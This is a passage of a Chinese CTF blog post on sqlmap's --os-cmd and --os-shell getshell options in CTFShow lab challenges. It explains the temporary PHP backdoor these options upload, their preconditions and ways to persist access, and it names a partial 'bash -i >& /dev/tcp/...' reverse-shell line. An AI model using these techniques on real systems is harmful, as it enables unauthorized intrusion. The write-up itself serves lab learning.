+<blockquote>
+<p><code>--web-root=/var/www/html</code>可以不加，去掉 <code>--web-root</code> 后，<code>sqlmap</code> 在 <code>--batch</code> 模式下会：</p>
+<ul>
+<li>提示选择后端语言，默认 PHP<ul>
+<li>自动遍历默认 web 根目录列表</li>
+<li>在 <code>/var/www/html</code> 找到可写目录，上传 <code>stager</code> + <code>backdoor</code></li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h2 id="两个方法区别"><a href="#两个方法区别" class="headerlink" title="两个方法区别"></a>两个方法区别</h2><p>两个方法都是 <code>getshell</code>，而且底层是同一套东西：<code>sqlmap</code> 往 <code>/var/www/html</code> 写一个临时 PHP 后门（<code>web</code>  <code>backdoor</code>），通过它执行系统命令，退出时再删掉。</p>
+<h3 id="区别只在交互方式："><a href="#区别只在交互方式：" class="headerlink" title="区别只在交互方式："></a>区别只在交互方式：</h3><table>
+<thead>
+<tr>
+<th></th>
+<th>–os-cmd&#x3D;”id”</th>
+<th>–os-shell</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>输入</td>
+<td>一次一条命令，执行完退出</td>
+<td>交互式，可连续输多条</td>
+</tr>
+<tr>
+<td>生命周期</td>
+<td>跑完即清理</td>
+<td>保持到 <code>exit/q</code> 再清理</td>
+</tr>
+<tr>
+<td>上传物</td>
+<td>stager + PHP backdoor</td>
+<td>同样</td>
+</tr>
+<tr>
+<td>权限</td>
+<td>继承 web 进程（本例 <code>www-data</code>）</td>
+<td>同左</td>
+</tr>
+</tbody></table>
+<h3 id="所以准确说法是："><a href="#所以准确说法是：" class="headerlink" title="所以准确说法是："></a>所以准确说法是：</h3><ul>
+<li>二者都是 <code>webshell</code> 形式的临时 RCE，不是持久化 webshell，也不是反弹 shell</li>
+<li><code>--os-cmd</code> &#x3D; 一次性命令执行（自动化友好）</li>
+<li><code>--os-shell</code> &#x3D; 同一个后门上的交互式系统 shell</li>
+</ul>
+<p>  如果要持久 <code>webshell</code>（后门不删）或反弹 <code>shell</code>，那 <code>sqlmap</code> 的这两个参数都不直接给：</p>
+<ul>
+<li>持久化：用 <code>--os-shell</code> 里的命令自己写一个马，或 <code>--file-write</code> 上传</li>
+<li>反弹 <code>shell</code>：用 <code>--os-pwn</code>（走 SQL 注入的 OOB，需 <code>Metasploit</code>，属于另一条链），或在 shell 里自己执行 <code>bash -i &gt;&amp; /dev/tcp/...</code></li>
+</ul>
+<blockquote>
+<p>另外提醒：这题 <code>sqlmap</code> 退出后确实把 <code>tmp*.php</code> 清理干净了（我复核过 <code>/var/www/html</code>），所以严格说它确实就是「临时<code>getshell</code>」，不是「留后门」。</p>
+</blockquote>
+<h2 id="结果-9"><a href="#结果-9" class="headerlink" title="结果"></a>结果</h2><ul>
+<li><code>--os-shell</code> 三个前提（本题<code>PHP</code>+<code>MySQLroot</code>全满足）：<ul>
+<li>堆叠查询可用</li>
+<li><code>DB</code>用户<code>DBA/FILE</code>权限</li>
+<li><code>web</code>目录可写</li>
+</ul>
+</li>
+<li>首次运行会遍历默认 web 根目录，<code>/var/www/</code> 失败是正常的，<code>/var/www/html</code> 才成功</li>
+<li>非交互环境必须 <code>--batch</code> + 管道输入 + <code>--web-root</code>，否则会卡在菜单</li>
+<li>退出时 <code>sqlmap</code> 会删掉上传的 php；仍建议手工 ls 确认一次</li>
+<li><code>--os-cmd</code> 适合一次性验证，<code>--os-shell</code> 适合连续操作，底层链路相同</li>
+</ul>
+<p><code>ctfshow&#123;363cc690-9178-40f3-9c51-23b54457fa44&#125;</code></p>
+<img src="/img/sqlmap01.png">
+
+
+
+<hr>
+<p>感觉还是用脚本的多，要不然说脚本小子的第一步呢！只不过现在是AI小子了，方便多了</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://baozongwi.xyz/p/sqlmap-usage/">sqlmap使用 - baozongwi’s blog</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="http://www.baidu.com">Teaaa</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/sqlmap/">http://example.com/sqlmap/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">choco</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8A%98%E8%85%BE/">折腾</a><a class="post-meta__tags" href="/tags/%E5%B7%A5%E5%85%B7/">工具</a><a class="post-meta__tags" href="/tags/SQL/">SQL</a></div><div class="post-share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/nmap/" title="Nmap详细使用总结及CTFShow-web859内网渗透测试"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Nmap详细使用总结及CTFShow-web859内网渗透测试</div></div><div class="info-2"><div class="info-item-1"> 成为 AI 小子的第一步！  工具简介Nmap 全称 Network Mapper（网络映射器），是开源免费、跨平台的网络探测与安全审计工具，是渗透测试、CTF、网络运维最经典的信息收集工具。  只允许扫描自己拥有授权的设备 &#x2F; 靶场，未经授权扫描公网 IP 属于违法行为，违反《网络安全法》 并且乱用的话也很容易触发告警，关于使用 Nmap 的风险可简单分为四类：  法律风险：无授权扫描违反《网络安全法》《治安管理处罚法》，严重可触及刑法； 告警风险：SYN 扫描、异常标志位、高速发包、版本探测特征明显，容易被 IDS、WAF、云安全检测，触发告警甚至 IP 封禁； 业务风险：高速扫描、UDP 扫描、NSE 脚本可能导致老旧设备宕机、服务异常、日志占满磁盘； 溯源风险：默认暴露源 IP，逃逸参数有局限，流量和日志可溯源定位扫描者。  所以不要乱用  基础信息 作者：Gordon Lyon（网名叫 Fyodor），1997 年首次发布，持续维护至今 开发语言：C&#x2F;C++、Lua、Python 支持平台：Linux（Kali 自带）、Windows、macOS、...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/nmap/" title="Nmap详细使用总结及CTFShow-web859内网渗透测试"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-17</div><div class="info-item-2">Nmap详细使用总结及CTFShow-web859内网渗透测试</div></div><div class="info-2"><div class="info-item-1"> 成为 AI 小子的第一步！  工具简介Nmap 全称 Network Mapper（网络映射器），是开源免费、跨平台的网络探测与安全审计工具，是渗透测试、CTF、网络运维最经典的信息收集工具。  只允许扫描自己拥有授权的设备 &#x2F; 靶场，未经授权扫描公网 IP 属于违法行为，违反《网络安全法》 并且乱用的话也很容易触发告警，关于使用 Nmap 的风险可简单分为四类：  法律风险：无授权扫描违反《网络安全法》《治安管理处罚法》，严重可触及刑法； 告警风险：SYN 扫描、异常标志位、高速发包、版本探测特征明显，容易被 IDS、WAF、云安全检测，触发告警甚至 IP 封禁； 业务风险：高速扫描、UDP 扫描、NSE 脚本可能导致老旧设备宕机、服务异常、日志占满磁盘； 溯源风险：默认暴露源 IP，逃逸参数有局限，流量和日志可溯源定位扫描者。  所以不要乱用  基础信息 作者：Gordon Lyon（网名叫 Fyodor），1997 年首次发布，持续维护至今 开发语言：C&#x2F;C++、Lua、Python 支持平台：Linux（Kali 自带）、Windows、macOS、...</div></div></div></a><a class="pagination-related" href="/Claude-Kali/" title="让ClaudeCode用Kali"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-08</div><div class="info-item-2">让ClaudeCode用Kali</div></div><div class="info-2"><div class="info-item-1">Claude Code 的 Agent 能力还是很不错的，本文手把手教你如何在 Kali 上配置 Claude Code，以及解决一些可能会遇到的问题，从而实现自动化渗透测试，不过我的 CC 还是很保守的。 这样的 Claude Code 工具建议部署在虚拟机或独立的物理设备中，不要在主力机上运行，因为自动化测试频繁调用脚本与工具可能会污染系统环境变量。 【Claude Code】使用Claude与Kali打造渗透测试专家 V1.0 - 极核GetShell 安装 Claude Code1、官方安装脚本，这里需要注意的是如果在国内，则会安装失败(地区政策)，所以需要使用科学上网 TUN 全局代理后来进行安装： 1curl -fsSL https://claude.ai/install.sh | bash  2、TUN 模式是一种底层的网络流量代理技术。它通过在操作系统中创建一个虚拟网卡，将所有出入设备的网络流量（无论是 TCP 还是 UDP）全部拦截并进行路由转发。在 Kali 上安装必须打开 TUN模式 才能成功下载 Claude Code。 代理可自行处理，但需要能打开 TU...</div></div></div></a><a class="pagination-related" href="/butterfly%E4%B8%BB%E9%A2%98%E9%83%A8%E7%BD%B2%E5%BF%83%E5%BE%97/" title="butterfly主题部署心得"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-26</div><div class="info-item-2">butterfly主题部署心得</div></div><div class="info-2"><div class="info-item-1">记得刚开始学web时候看到学长的博客，暖色调十分唯美，还有动态打字效果，太酷了，被学长带着部署了一个hexo+github的博客，一开始简简单单选的cactus（仙人掌）主题，说是简洁高端大气上档次，但是自己还是想做一个像他们一样的页面。 现在把这个博客主题换了一下，github上也改了下，用了butterfly这个主题，改了半天终于差不多了，记录一下自己怎么搞的，忘了也看得懂，基础部署就不说了，主要是在butterfly主题的config.yml文件里操作。 Menu菜单，这里面没啥好说的，注意格式就行了，就主页有什么东西能点 123456menu:   主页: / || fas fa-home   关于: /about/ || fas fa-user   归档: /archives/ || fa fa-folder-open   标签: /tags/ || fa fa-tags   友链: /links/ || fa fa-link  Code blocks代码块，终于知道那些好看的苹果风格代码块怎么来的了！ 123456789101112131415code_blocks:...</div></div></div></a><a class="pagination-related" href="/Docker-vulhub/" title="Docker安装及vulhub靶场部署"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-30</div><div class="info-item-2">Docker安装及vulhub靶场部署</div></div><div class="info-2"><div class="info-item-1">Docker是个好东西啊，没有人比我更晚玩Docker了🥹😭。新装个ubuntu Docker常用命令速查一、服务管理（systemctl，控制 docker 后台 daemon）12345678910111213# 启动docker服务sudo systemctl start docker # 停止docker服务sudo systemctl stop docker# 查看docker服务状态sudo systemctl status docker# 设置开机自启sudo systemctl enable docker# 修改daemon.json配置后重载系统配置sudo systemctl daemon-reload# 重启docker服务（修改daemon.json后必用）sudo systemctl restart docker  二、镜像操作（image）123456789101112# 查看本地所有镜像sudo docker images# 搜索镜像sudo docker search 镜像名# 拉取镜像sudo docker pull 镜像名:版本# 删除镜像...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Teaaa</div><div class="author-info-description">一万年太久只争朝夕</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/chocoteaaa/chocoteaaa.github.io.git"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">扎根ing 😲</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">工具简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">基础信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E8%83%BD%E5%8A%9B%E6%80%BB%E8%A7%88"><span class="toc-number">1.2.</span> <span class="toc-text">核心能力总览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E5%A4%A7%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">六大注入原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-number">1.4.</span> <span class="toc-text">优缺点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%98%E7%82%B9"><span class="toc-number">1.4.1.</span> <span class="toc-text">优点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%BA%E7%82%B9"><span class="toc-number">1.4.2.</span> <span class="toc-text">缺点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E8%83%BD%E5%8A%9B%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">核心能力利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%8F%82%E6%95%B0%E6%80%BB%E8%A1%A8"><span class="toc-number">3.</span> <span class="toc-text">基础参数总表</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E9%80%89%E9%A1%B9"><span class="toc-number">3.1.</span> <span class="toc-text">基础选项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E6%A8%A1%E5%BC%8F%EF%BC%88%E5%BF%85%E9%A1%BB%E9%80%89%E8%87%B3%E5%B0%91%E4%B8%80%E7%A7%8D%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">目标模式（必须选至少一种）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%8E%A7%E5%88%B6%E9%80%89%E9%A1%B9%EF%BC%88%E5%8F%91%E5%8C%85%E7%9B%B8%E5%85%B3%EF%BC%89"><span class="toc-number">3.3.</span> <span class="toc-text">请求控制选项（发包相关）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E9%80%89%E9%A1%B9"><span class="toc-number">3.4.</span> <span class="toc-text">性能优化选项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%AE%9A%E5%88%B6%E9%80%89%E9%A1%B9"><span class="toc-number">3.5.</span> <span class="toc-text">注入定制选项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%A0%A1%E5%87%86%E9%80%89%E9%A1%B9%EF%BC%88%E8%A7%A3%E5%86%B3%E9%A1%B5%E9%9D%A2%E5%8A%A8%E6%80%81%E3%80%81%E8%AF%AF%E5%88%A4%EF%BC%89"><span class="toc-number">3.6.</span> <span class="toc-text">检测校准选项（解决页面动态、误判）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF%E9%80%89%E9%A1%B9"><span class="toc-number">3.7.</span> <span class="toc-text">注入技术选项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E3%80%81%E6%9E%9A%E4%B8%BE%E9%80%89%E9%A1%B9%EF%BC%88%E6%9F%A5%E5%BA%93%E6%9F%A5%E8%A1%A8%E6%9F%A5%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="toc-number">3.8.</span> <span class="toc-text">指纹、枚举选项（查库查表查数据）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E9%80%89%E9%A1%B9"><span class="toc-number">3.9.</span> <span class="toc-text">暴力破解选项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E8%AE%BF%E9%97%AE%EF%BC%88%E9%9C%80%E8%A6%81%E9%AB%98%E6%9D%83%E9%99%90%EF%BC%89"><span class="toc-number">3.10.</span> <span class="toc-text">文件系统访问（需要高权限）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BF%E9%97%AE%EF%BC%88%E9%9C%80%E8%A6%81-DBA-%E6%9D%83%E9%99%90%EF%BC%89"><span class="toc-number">3.11.</span> <span class="toc-text">操作系统访问（需要 DBA 权限）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%80%89%E9%A1%B9"><span class="toc-number">3.12.</span> <span class="toc-text">Windows 注册表选项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AC%E5%85%B1%E9%80%9A%E7%94%A8%E9%80%89%E9%A1%B9%EF%BC%88%E9%AB%98%E9%A2%91%EF%BC%89"><span class="toc-number">3.13.</span> <span class="toc-text">公共通用选项（高频）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%BE%85%E5%8A%A9%E9%80%89%E9%A1%B9"><span class="toc-number">3.14.</span> <span class="toc-text">其他辅助选项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E6%AE%B5%E6%A0%87%E5%87%86%E5%AE%9E%E6%93%8D%E6%B5%81%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">七段标准实操流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A3%85%E8%BD%BD%E7%9B%AE%E6%A0%87%EF%BC%9A%E9%80%89%E6%8B%A9%E8%BE%93%E5%85%A5%E6%BA%90"><span class="toc-number">4.1.</span> <span class="toc-text">装载目标：选择输入源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%AF%B9%E9%BD%90%EF%BC%9A%E5%8F%91%E5%8C%85%E5%92%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%9D%E6%8C%81%E4%B8%80%E8%87%B4%EF%BC%88%E6%8E%92%E9%94%99%E9%AB%98%E5%8F%91%E6%AE%B5%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">请求对齐：发包和浏览器保持一致（排错高发段）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E4%B8%8E%E5%88%A4%E5%AE%9A%EF%BC%9A%E5%85%88%E8%BD%BB%E5%90%8E%E9%87%8D-%E5%88%A4%E7%A9%BA%E6%A0%A1%E5%87%86"><span class="toc-number">4.3.</span> <span class="toc-text">探测与判定：先轻后重 + 判空校准</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E4%B8%8E%E6%9D%83%E9%99%90%E7%94%BB%E5%83%8F%EF%BC%9A%E5%88%A4%E6%96%AD%E4%BD%A0%E8%83%BD%E6%8B%BF%E5%88%B0%E5%A4%9A%E5%B0%91%E6%9D%83%E9%99%90"><span class="toc-number">4.4.</span> <span class="toc-text">指纹与权限画像：判断你能拿到多少权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%EF%BC%9A%E7%B2%BE%E5%87%86%E4%BC%98%E5%85%88%EF%BC%8C%E6%8B%92%E7%BB%9D%E5%85%A8%E9%87%8F%E7%88%86%E7%A0%B4"><span class="toc-number">4.5.</span> <span class="toc-text">枚举：精准优先，拒绝全量爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%88%E5%BF%85%E9%A1%BB-DBA-%E6%9D%83%E9%99%90%EF%BC%8C%E9%97%A8%E6%A7%9B%E9%AB%98%EF%BC%8C%E5%85%88%E4%BA%86%E8%A7%A3%EF%BC%8C%E4%B8%8D%E8%A6%81%E4%B8%80%E4%B8%8A%E6%9D%A5%E5%B0%B1%E5%86%B2-shell%EF%BC%89"><span class="toc-number">4.6.</span> <span class="toc-text">高阶利用（必须 DBA 权限，门槛高，先了解，不要一上来就冲 shell）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96%E4%B8%8E%E4%BC%9A%E8%AF%9D%EF%BC%9Asqlmap-%E6%98%AF%E6%9C%89%E7%8A%B6%E6%80%81%E5%B7%A5%E5%85%B7"><span class="toc-number">4.7.</span> <span class="toc-text">持久化与会话：sqlmap 是有状态工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%BD%95%EF%BC%9Asqlmap1-10-%E6%96%B0%E5%A2%9E%E9%9D%9E-SQLi-%E6%A3%80%E6%B5%8B%E9%9D%A2%EF%BC%88%E7%8B%AC%E7%AB%8B%E5%BC%95%E6%93%8E%EF%BC%8C%E5%90%8E%E6%9C%9F%E6%8E%A5%E8%A7%A6%EF%BC%89"><span class="toc-number">4.8.</span> <span class="toc-text">附录：sqlmap1.10 新增非 SQLi 检测面（独立引擎，后期接触）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E9%A2%91%E9%80%9F%E8%AE%B0-12-%E6%9D%A1%E5%91%BD%E4%BB%A4"><span class="toc-number">4.9.</span> <span class="toc-text">高频速记 12 条命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTFShow%E7%BB%83%E4%B9%A0"><span class="toc-number">5.</span> <span class="toc-text">CTFShow练习</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web201"><span class="toc-number">6.</span> <span class="toc-text">web201</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA%EF%BC%9A"><span class="toc-number">6.1.</span> <span class="toc-text">提示：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">6.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">6.3.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%86%8D%E6%AC%A1%E4%B8%80%E8%A7%88"><span class="toc-number">6.4.</span> <span class="toc-text">参数再次一览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E8%A7%82%E5%AF%9F%E5%88%B0%E7%9A%84%E7%BB%93%E6%9E%9C"><span class="toc-number">6.5.</span> <span class="toc-text">实际观察到的结果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web202"><span class="toc-number">7.</span> <span class="toc-text">Web202</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA"><span class="toc-number">7.1.</span> <span class="toc-text">提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">7.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-1"><span class="toc-number">7.3.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C"><span class="toc-number">7.4.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web203"><span class="toc-number">8.</span> <span class="toc-text">Web203</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA-1"><span class="toc-number">8.1.</span> <span class="toc-text">提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-number">8.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-2"><span class="toc-number">8.3.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C%E4%B8%8E%E6%8F%90%E7%A4%BA"><span class="toc-number">8.4.</span> <span class="toc-text">结果与提示</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web204"><span class="toc-number">9.</span> <span class="toc-text">Web204</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA-2"><span class="toc-number">9.1.</span> <span class="toc-text">提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-number">9.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-3"><span class="toc-number">9.3.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-1"><span class="toc-number">9.4.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web205"><span class="toc-number">10.</span> <span class="toc-text">Web205</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA-3"><span class="toc-number">10.1.</span> <span class="toc-text">提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-number">10.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-4"><span class="toc-number">10.3.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90"><span class="toc-number">10.4.</span> <span class="toc-text">结果分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web206"><span class="toc-number">11.</span> <span class="toc-text">Web206</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA-4"><span class="toc-number">11.1.</span> <span class="toc-text">提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-5"><span class="toc-number">11.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-5"><span class="toc-number">11.3.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-2"><span class="toc-number">11.4.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web207"><span class="toc-number">12.</span> <span class="toc-text">Web207</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA-5"><span class="toc-number">12.1.</span> <span class="toc-text">提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-6"><span class="toc-number">12.2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tamper%E5%8F%82%E6%95%B0%EF%BC%9A"><span class="toc-number">12.2.1.</span> <span class="toc-text">tamper参数：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-number">12.2.2.</span> <span class="toc-text">WAF与绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-6"><span class="toc-number">12.3.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-3"><span class="toc-number">12.4.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web208"><span class="toc-number">13.</span> <span class="toc-text">Web208</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA-6"><span class="toc-number">13.1.</span> <span class="toc-text">提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-7"><span class="toc-number">13.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-7"><span class="toc-number">13.3.</span> <span class="toc-text">测试</span></a></li><li class="toc-item 